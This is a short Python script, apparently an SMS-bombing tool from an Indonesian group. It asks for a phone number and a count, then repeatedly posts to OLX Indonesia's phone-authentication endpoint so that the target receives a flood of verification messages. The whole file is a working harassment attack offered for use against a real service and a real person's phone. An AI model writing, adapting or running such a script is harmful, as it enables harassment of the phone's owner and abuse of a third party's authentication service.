import requests, time
print("""
\33[93m\nNIRVANA CODER TEAM 
     -AKF-
""")
print("\nKUSUS NO INDO")



num=input("\nNOPE[ID] ")
jum=int(input("\nJumlah "))


if num[0] == "0":
  num=num[1:]
elif num[0:2] == "62":
  num=num[2:]

print("\n[RESULT]")
for x in range(jum):
  req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":f"+62{num}","language":"id"}).json()
  if req['status'] == 'PENDING':
    print(f"{x+1}. Berhasil {num}")
    
  else:
    print(f"{x+1}. Gagal {num}")
  time.sleep(1.5)
